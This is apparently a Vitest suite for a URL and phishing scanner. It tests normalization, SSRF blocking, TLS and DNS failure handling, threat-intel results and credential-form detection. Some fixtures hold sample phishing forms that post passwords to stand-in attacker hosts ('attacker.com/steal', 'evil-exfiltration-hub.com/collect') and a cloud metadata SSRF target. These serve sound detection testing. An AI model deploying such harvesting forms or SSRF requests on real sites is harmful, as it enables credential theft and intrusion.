import { describe, it, expect, vi } from 'vitest';
import { urlNormalizerService } from '../services/url-normalizer.service';
import { domainIntelligenceService } from '../services/domain-intelligence.service';
import { threatIntelService } from '../services/threat-intel.service';
import { scanService } from '../services/scan.service';
import { phishingScannerService } from '../services/phishing-scanner.service';

// Mock Mongoose Scan model to allow isolated unit testing
vi.mock('../models/Scan', async () => {
  const original = await vi.importActual('../models/Scan');
  function MockScan(this: any, data: any) {
    Object.assign(this, data);
    this._id = { toString: () => 'mock-scan-id-url-evidence-123' };
    this.createdAt = new Date();
    this.save = vi.fn().mockResolvedValue(this);
  }
  return {
    ...original as any,
    Scan: MockScan,
  };
});

describe('Production-Grade URL & Phishing Scanner - Section 30 Verification Suite', () => {
  // 1. Safe HTTPS URL
  it('1. Safe HTTPS URL - parses cleanly and evaluates low risk with observed TLS and DNS', () => {
    const norm = urlNormalizerService.normalize('https://example.com/login');
    expect(norm.isValid).toBe(true);
    expect(norm.scheme).toBe('https');
    expect(norm.hostname).toBe('example.com');
    expect(norm.registrableDomain).toBe('example.com');

    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://example.com/login',
      normalizedUrl: norm.normalizedUrl,
      targetUrl: norm.normalizedUrl,
      domain: norm.hostname,
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', ipVersion: 'IPv4', isPrivate: false },
      sslData: { valid: true, issuer: 'DigiCert Global Root G2', protocol: 'TLSv1.3', subject: 'example.com' },
      httpData: { statusCode: 200, statusText: 'OK', responseTimeMs: 85, allHeaders: { 'strict-transport-security': 'max-age=31536000', 'x-content-type-options': 'nosniff' } },
    });

    expect(evalResult.analysis.certificateSummary?.httpsEnabled).toBe(true);
    expect(evalResult.classification).toBe('Safe');
    expect(evalResult.riskScore).toBeLessThanOrEqual(24);
  });

  // 2. HTTP URL
  it('2. HTTP URL - flags unencrypted transport without severe phishing escalation', () => {
    const norm = urlNormalizerService.normalize('http://example.com');
    expect(norm.scheme).toBe('http');

    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'http://example.com',
      normalizedUrl: norm.normalizedUrl,
      targetUrl: norm.normalizedUrl,
      domain: norm.hostname,
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', ipVersion: 'IPv4', isPrivate: false },
      sslData: null,
      httpData: { statusCode: 200, statusText: 'OK', headers: {} },
    });

    expect(evalResult.analysis.certificateSummary?.httpsEnabled).toBe(false);
    expect(evalResult.findings.some(f => f.title.includes('Unencrypted') || f.category === 'Transport Security')).toBe(true);
    expect(evalResult.analysis.auditChecks?.find(c => c.name === 'Protocol Security')?.status).toBe('WARN');
  });

  // 3. Malformed URL
  it('3. Malformed URL - reports invalid normalization structure honestly', () => {
    const norm = urlNormalizerService.normalize('ftp://///bad_url:invalid');
    expect(norm.isValid).toBe(false);
    expect(norm.isMalformed).toBe(true);
    expect(norm.validationError).toBeDefined();
  });

  // 4. IP-based URL
  it('4. IP-based URL - detects raw IP host and flags hostname structure', () => {
    const norm = urlNormalizerService.normalize('http://93.184.216.34/login');
    expect(norm.isDirectIp).toBe(true);
    expect(norm.hostname).toBe('93.184.216.34');

    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'http://93.184.216.34/login',
      normalizedUrl: norm.normalizedUrl,
      targetUrl: norm.normalizedUrl,
      domain: norm.hostname,
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', ipVersion: 'IPv4', isPrivate: false },
      httpData: { statusCode: 200 },
    });

    expect(evalResult.analysis.isDirectIp).toBe(true);
    expect(evalResult.findings.some(f => f.title.includes('Direct IP'))).toBe(true);
  });

  // 5. Punycode URL
  it('5. Punycode URL - detects internationalized xn-- labels and raises homograph warning', () => {
    const norm = urlNormalizerService.normalize('https://xn--e1afmkfd.xn--p1ai/auth');
    expect(norm.hasPunycode).toBe(true);
    expect(norm.punycodeHostname).toContain('xn--');

    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://xn--e1afmkfd.xn--p1ai/auth',
      normalizedUrl: norm.normalizedUrl,
      targetUrl: norm.normalizedUrl,
      domain: norm.hostname,
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', ipVersion: 'IPv4', isPrivate: false },
      sslData: { valid: true },
      httpData: { statusCode: 200 },
    });

    expect(evalResult.analysis.hasPunycode).toBe(true);
    expect(evalResult.findings.some(f => f.title.includes('Punycode') || f.title.includes('Homograph') || f.title.includes('IDN'))).toBe(true);
  });

  // 6. URL with embedded credentials
  it('6. URL with embedded credentials - flags embedded user credentials pattern', () => {
    const norm = urlNormalizerService.normalize('https://admin:secret123@example.com/panel');
    expect(norm.hasEmbeddedCredentials).toBe(true);
    expect(norm.username).toBe('admin');
    expect(norm.hasPassword).toBe(true);
  });

  // 7. Excessive redirect chain
  it('7. Excessive redirect chain - records error and raises redirect loop finding', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://example.com/loop',
      normalizedUrl: 'https://example.com/loop',
      targetUrl: 'https://example.com/loop',
      domain: 'example.com',
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', isPrivate: false },
      httpData: { error: 'MAX_REDIRECTS_EXCEEDED', redirectCount: 12 },
    });

    expect(evalResult.findings.some(f => f.title.includes('Redirect Loop') || f.title.includes('Maximum Hops'))).toBe(true);
  });

  // 8. SSRF localhost target
  it('8. SSRF localhost target - blocks connection to 127.0.0.1 and raises CRITICAL SSRF finding', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'http://127.0.0.1/admin',
      normalizedUrl: 'http://127.0.0.1/admin',
      targetUrl: 'http://127.0.0.1/admin',
      domain: '127.0.0.1',
      dnsData: { resolvedIps: ['127.0.0.1'], dnsStatus: 'RESOLVED', isPrivate: true },
      httpData: { error: 'SSRF_BLOCKED' },
    });

    expect(evalResult.findings.some(f => f.title.includes('SSRF') || f.title.includes('Private'))).toBe(true);
    expect(evalResult.riskScore).toBeGreaterThanOrEqual(70);
  });

  // 9. Private IP
  it('9. Private IP - identifies RFC 1918 10.0.0.1 as private address', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'http://10.0.0.1/intranet',
      normalizedUrl: 'http://10.0.0.1/intranet',
      targetUrl: 'http://10.0.0.1/intranet',
      domain: '10.0.0.1',
      dnsData: { resolvedIps: ['10.0.0.1'], dnsStatus: 'RESOLVED', isPrivate: true },
      httpData: { error: 'SSRF_BLOCKED' },
    });

    expect(evalResult.analysis.auditChecks?.find(c => c.name?.includes('DNS'))?.status).toBe('FAIL');
  });

  // 10. Metadata endpoint
  it('10. Metadata endpoint - blocks 169.254.169.254 link-local metadata address', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'http://169.254.169.254/latest/meta-data/',
      normalizedUrl: 'http://169.254.169.254/latest/meta-data/',
      targetUrl: 'http://169.254.169.254/latest/meta-data/',
      domain: '169.254.169.254',
      dnsData: { resolvedIps: ['169.254.169.254'], dnsStatus: 'RESOLVED', isPrivate: true },
      httpData: { error: 'SSRF_BLOCKED' },
    });

    expect(evalResult.findings.some(f => f.severity === 'CRITICAL')).toBe(true);
  });

  // 11. Malicious TI match
  it('11. Malicious TI match - records confirmed threat intelligence match and scores CRITICAL', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://bad-malware-domain.com/drop.exe',
      normalizedUrl: 'https://bad-malware-domain.com/drop.exe',
      targetUrl: 'https://bad-malware-domain.com/drop.exe',
      domain: 'bad-malware-domain.com',
      dnsData: { resolvedIps: ['198.51.100.4'], dnsStatus: 'RESOLVED', isPrivate: false },
      sslData: { valid: true },
      httpData: { statusCode: 200 },
      threatIntelResult: {
        status: 'Threat Detected',
        provider: 'VirusTotal',
        result: 'MALICIOUS',
        queried: true,
        timestamp: new Date().toISOString(),
        indicators: ['Malicious URL', 'Malware Delivery'],
        details: '15 of 92 engines flagged destination as malicious.',
      } as any,
    });

    expect(evalResult.riskScore).toBeGreaterThanOrEqual(70);
    expect(evalResult.findings.some(f => f.category === 'Threat Intelligence' || f.title.includes('Threat'))).toBe(true);
  });

  // 12. Phishing provider match
  it('12. Phishing provider match - reflects Google Web Risk SOCIAL_ENGINEERING category', () => {
    const phishEval = phishingScannerService.analyze({
      target: 'https://fake-login-bank.com/signin',
      normalizedTarget: 'https://fake-login-bank.com/signin',
      parsedUrl: new URL('https://fake-login-bank.com/signin'),
      dnsResult: { resolvedIps: ['198.51.100.2'], ipVersion: 'IPv4', dnsStatus: 'RESOLVED', isPrivate: false },
      httpResult: { statusCode: 200, statusText: 'OK', headers: {}, htmlSnippet: '<form action="http://attacker.com/steal"><input type="password" name="pwd"></form>' } as any,
      tlsResult: { valid: true } as any,
      effectiveHttps: true,
      threatIntelResult: {
        status: 'Threat Detected',
        provider: 'Google Web Risk',
        result: 'MALICIOUS',
        queried: true,
        timestamp: new Date().toISOString(),
        indicators: ['SOCIAL_ENGINEERING'],
        details: 'Google Web Risk confirmed threat match: SOCIAL_ENGINEERING',
      } as any,
    });

    expect(phishEval.phishingSecurityAnalysis.status).toBe('warning');
    expect(phishEval.findings.some(f => f.category === 'Threat Intelligence' || f.category === 'Phishing & Deception')).toBe(true);
  });

  // 13. No TI match
  it('13. No TI match - does NOT fabricate guaranteed safe, returns honest unconfirmed status', async () => {
    const lookup = await threatIntelService.lookup('https://example.com', 'example.com');
    expect(lookup.status).toBeDefined();
    expect(lookup.details).not.toContain('100% Safe');
    expect(lookup.details).not.toContain('Guaranteed Safe');
  });

  // 14. Provider unavailable
  it('14. Provider unavailable - handles unconfigured providers gracefully with NOT CONFIGURED', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://example.com',
      normalizedUrl: 'https://example.com',
      targetUrl: 'https://example.com',
      domain: 'example.com',
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', isPrivate: false },
      threatIntelResult: undefined,
    });

    expect(evalResult.analysis.threatIntelligence?.status).toBe('Not Configured');
    expect(evalResult.analysis.threatIntelligence?.result).toBe('Not Available');
  });

  // 15. DNS failure
  it('15. DNS failure - records unresolvable domain without fake clean outcome', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://nonexistent-zone-xyz1234.org',
      normalizedUrl: 'https://nonexistent-zone-xyz1234.org',
      targetUrl: 'https://nonexistent-zone-xyz1234.org',
      domain: 'nonexistent-zone-xyz1234.org',
      dnsData: { resolvedIps: [], dnsStatus: 'FAILED', error: 'ENOTFOUND', isPrivate: false },
    });

    expect(evalResult.findings.some(f => f.title.includes('DNS Resolution Failed'))).toBe(true);
    expect(evalResult.analysis.auditChecks?.find(c => c.name?.includes('DNS'))?.status).toBe('FAIL');
  });

  // 16. HTTP failure
  it('16. HTTP failure - records connection failure honestly', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://example.com/unreachable',
      normalizedUrl: 'https://example.com/unreachable',
      targetUrl: 'https://example.com/unreachable',
      domain: 'example.com',
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', isPrivate: false },
      httpData: { error: 'ECONNREFUSED', details: 'Connection refused by destination host' },
    });

    expect(evalResult.findings.some(f => f.title.includes('Target Connection Failed'))).toBe(true);
  });

  // 17. TLS failure
  it('17. TLS failure - flags invalid certificate and raises HIGH severity finding', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://expired.badssl.com',
      normalizedUrl: 'https://expired.badssl.com',
      targetUrl: 'https://expired.badssl.com',
      domain: 'expired.badssl.com',
      dnsData: { resolvedIps: ['104.154.89.105'], dnsStatus: 'RESOLVED', isPrivate: false },
      sslData: { valid: false, error: 'CERT_HAS_EXPIRED', details: 'Certificate has expired' },
      effectiveHttps: true,
    });

    expect(evalResult.findings.some(f => f.title.includes('Invalid SSL/TLS Certificate'))).toBe(true);
    expect(evalResult.analysis.auditChecks?.find(c => c.name?.includes('TLS Certificate'))?.status).toBe('FAIL');
  });

  // 18. Credential form
  it('18. Credential form - detects password input and login forms in static HTML inspection', () => {
    // Insecure HTTP password form
    const phishHttpEval = phishingScannerService.analyze({
      target: 'http://auth-portal.com/login',
      normalizedTarget: 'http://auth-portal.com/login',
      parsedUrl: new URL('http://auth-portal.com/login'),
      dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'RESOLVED', isPrivate: false },
      httpResult: {
        statusCode: 200,
        statusText: 'OK',
        headers: {},
        htmlSnippet: '<!DOCTYPE html><html><body><form method="POST" action="/api/login"><input type="text" name="user"><input type="password" name="pwd"><button type="submit">Log In</button></form></body></html>',
      } as any,
      tlsResult: null,
      effectiveHttps: false,
    });

    expect(phishHttpEval.findings.some(f => f.title.includes('Password') || f.title.includes('Credential') || f.title.includes('Insecure'))).toBe(true);
    expect(phishHttpEval.indicators.some(i => i.id === 'ind-cred-insecure' && i.status === 'FAIL')).toBe(true);

    // Secure HTTPS first-party login form
    const phishHttpsEval = phishingScannerService.analyze({
      target: 'https://auth-portal.com/login',
      normalizedTarget: 'https://auth-portal.com/login',
      parsedUrl: new URL('https://auth-portal.com/login'),
      dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'RESOLVED', isPrivate: false },
      httpResult: {
        statusCode: 200,
        statusText: 'OK',
        headers: {},
        htmlSnippet: '<!DOCTYPE html><html><body><form method="POST" action="/api/login"><input type="text" name="user"><input type="password" name="pwd"><button type="submit">Log In</button></form></body></html>',
      } as any,
      tlsResult: { valid: true } as any,
      effectiveHttps: true,
    });

    expect(phishHttpsEval.positiveSignals.some(s => s.title.includes('Login') || s.title.includes('Authentication'))).toBe(true);
  });

  // 19. External form submission
  it('19. External form submission - flags cross-origin form action targeting third-party domain', () => {
    const phishEval = phishingScannerService.analyze({
      target: 'https://legit-looking-page.com/login',
      normalizedTarget: 'https://legit-looking-page.com/login',
      parsedUrl: new URL('https://legit-looking-page.com/login'),
      dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'RESOLVED', isPrivate: false },
      httpResult: {
        statusCode: 200,
        statusText: 'OK',
        headers: {},
        htmlSnippet: '<form method="POST" action="https://evil-exfiltration-hub.com/collect"><input type="password" name="password"></form>',
      } as any,
      tlsResult: { valid: true } as any,
      effectiveHttps: true,
    });

    expect(phishEval.findings.some(f => f.title.includes('External') || f.title.includes('Cross-Origin') || f.title.includes('Form'))).toBe(true);
  });

  // 20. Risk score calculation
  it('20. Risk score calculation - bounded within [0, 100] and derived strictly from evidence', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://example.com',
      normalizedUrl: 'https://example.com',
      targetUrl: 'https://example.com',
      domain: 'example.com',
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', isPrivate: false },
      sslData: { valid: true },
      httpData: { statusCode: 200, statusText: 'OK' },
    });

    expect(evalResult.riskScore).toBeGreaterThanOrEqual(0);
    expect(evalResult.riskScore).toBeLessThanOrEqual(100);
  });

  // 21. Finding deduplication
  it('21. Finding deduplication - aggregates distinct signals without repeating duplicate findings', () => {
    const urlEval = scanService.analyzeUrlSecurity({
      originalUrl: 'https://paypal.attacker-control.com/login',
      normalizedUrl: 'https://paypal.attacker-control.com/login',
      targetUrl: 'https://paypal.attacker-control.com/login',
      domain: 'paypal.attacker-control.com',
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', isPrivate: false },
      sslData: { valid: true },
      httpData: { statusCode: 200 },
    });

    const phishEval = phishingScannerService.analyze({
      target: 'https://paypal.attacker-control.com/login',
      normalizedTarget: 'https://paypal.attacker-control.com/login',
      parsedUrl: new URL('https://paypal.attacker-control.com/login'),
      dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'RESOLVED', isPrivate: false },
      httpResult: { statusCode: 200, statusText: 'OK', headers: {} } as any,
      tlsResult: { valid: true } as any,
      effectiveHttps: true,
    });

    const deduped = scanService.aggregateMegaScanFindings(urlEval, phishEval, {
      target: 'https://paypal.attacker-control.com/login',
      normalizedTarget: 'https://paypal.attacker-control.com/login',
      parsedUrl: new URL('https://paypal.attacker-control.com/login'),
      dnsResult: { resolvedIps: ['93.184.216.34'], ipVersion: 'IPv4', dnsStatus: 'RESOLVED', isPrivate: false },
      httpResult: { statusCode: 200, statusText: 'OK' } as any,
      tlsResult: { valid: true } as any,
      effectiveHttps: true,
    });

    const titles = deduped.findings.map(f => f.title);
    const uniqueTitles = Array.from(new Set(titles));
    expect(titles.length).toBe(uniqueTitles.length);
  });

  // 22. Partial analysis
  it('22. Partial analysis - reflects incomplete stages when DNS or HTTP fails', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://offline-host.example',
      normalizedUrl: 'https://offline-host.example',
      targetUrl: 'https://offline-host.example',
      domain: 'offline-host.example',
      dnsData: { resolvedIps: [], dnsStatus: 'FAILED', error: 'ENOTFOUND', isPrivate: false },
      httpData: { error: 'ECONNREFUSED' },
    });

    expect(evalResult.analysis.executionOutcome).toBeDefined();
    expect(evalResult.findings.some(f => f.title.includes('Failed') || f.title.includes('Connection'))).toBe(true);
  });

  // 23. Final verdict
  it('23. Final verdict - provides non-absolutist explainable language', () => {
    const evalResult = scanService.analyzeUrlSecurity({
      originalUrl: 'https://example.com',
      normalizedUrl: 'https://example.com',
      targetUrl: 'https://example.com',
      domain: 'example.com',
      dnsData: { resolvedIps: ['93.184.216.34'], dnsStatus: 'RESOLVED', isPrivate: false },
      sslData: { valid: true },
      httpData: { statusCode: 200 },
    });

    expect(evalResult.analysis.limitations?.some(l => l.includes('does not guarantee'))).toBe(true);
    expect(evalResult.analysis.whyVerdict?.length).toBeGreaterThan(0);
  });

  // 24. API response schema
  it('24. API response schema - ensures all required top-level analysis contracts are populated', async () => {
    const result = await scanService.analyzeAndSave({
      target: 'https://example.com',
      targetType: 'URL',
    });

    expect(result.id).toBeDefined();
    expect(result.target).toBeDefined();
    expect(result.status).toBe('completed');
    expect(result.result).toBeDefined();
    expect(result.riskScore).toBeDefined();
    expect(result.checks.urlSecurityAnalysis).toBeDefined();
    expect(result.checks.urlSecurityAnalysis?.auditChecks?.length).toBe(14);
  });
});
